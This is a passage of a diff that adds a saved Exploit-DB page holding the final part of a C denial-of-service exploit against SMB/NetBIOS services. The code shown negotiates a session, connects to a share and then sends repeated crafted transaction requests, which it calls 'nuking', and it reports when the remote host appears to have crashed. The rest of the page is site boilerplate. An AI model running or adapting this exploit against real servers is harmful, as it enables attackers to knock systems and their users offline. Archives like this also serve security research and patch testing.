+  tv.tv_usec = 0;
+
+  state = STATE_REQUESTING_SESSION_SETUP;
+
+  request_session_setup (fd, name);
+
+  for (;;)
+    {
+      if (!select (fd + 1, &amp;rfds, NULL, NULL, &amp;tv))
+        {
+          if (state == STATE_REQUESTING_TRANSACTION)
+            {
+              fprintf (stderr,
+                       &quot;Timeout during TCP read - Seems like the remote host has crashed\n&quot;);
+              return 0;
+            }
+          else
+            {
+              fprintf (stderr,
+                       &quot;Nuke failed (tcp timeout) at state %#02x, exiting...\n&quot;,
+                       state);
+              return 1;
+            }
+        }
+
+      r = read (fd, buffer, sizeof (buffer));
+
+      if (r == 0)
+        {
+          printf
+            (&quot;Nuke failed at state %#02x (EOF, wrong netbios name ?), exiting...\n&quot;,
+             state);
+          exit (1);
+        }
+
+      if (((smb_header *) (buffer + 4))-&gt;error_class != 0)
+        {
+          fprintf (stderr, &quot;Nuke failed at state %#02x, exiting...\n&quot;, state);
+          exit (1);
+        }
+
+      switch (state)
+        {
+        case STATE_REQUESTING_SESSION_SETUP:
+          printf (&quot;Negotiating protocol...\n&quot;);
+          negotiate_protocol (buffer, fd);
+          break;
+        case STATE_NEGOTIATING_PROTOCOL:
+          printf (&quot;Requesting session setup (AndX)\n&quot;);
+          request_session_setup_andx (buffer, fd);
+          break;
+        case STATE_REQUESTING_SESSION_SETUP_ANDX:
+          printf (&quot;Requesting tree connect (AndX)\n&quot;);
+          request_tree_connect_andx (buffer, fd, name);
+          break;
+        case STATE_REQUESTING_TREE_CONNECT_ANDX:
+          for (i = 0; i &lt; packets; i++)
+            {
+              printf (&quot;Requesting transaction (nuking) #%d\n&quot;, i + 1);
+              request_transaction (buffer, fd);
+            }
+	    printf (&quot;Wait...\n&quot;);
+          break;
+        default:
+          printf (&quot;Seems like the nuke failed :/ (patched ?)\n&quot;);
+	  exit (1);
+        }
+
+      state++;
+    }
+
+  return 0;
+}
+</pre>
+		</div>
+<br /><br /><br />
+
+<div class="barColor">		
+<center>
+<br /><br />
+
+
+</center>
+	
+		
+		
+		<br />
+
+		<fieldset id="digicomments" style="width:755px;  margin-left:auto; margin-right:auto; background-color:#eaeaea;"> 
+		<legend>Comments</legend>
+		<div id="comments2">
+			
+										<h3>No comments so far</h3>
+										<!-- <p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/21746">Login</a>/<a href="http://www.exploit-db.com/?page_id=1323">Register</a> to be able to post comments</p> -->
+					</div>
+		</fieldset>
+
+<br /><br />
+<center>
+<div id="footer">
+
+
+<br /><br />
+
+        &copy; Offensive Security 2011
+</div></center>
+			
+				
+		</div>
+</body>
+</html>
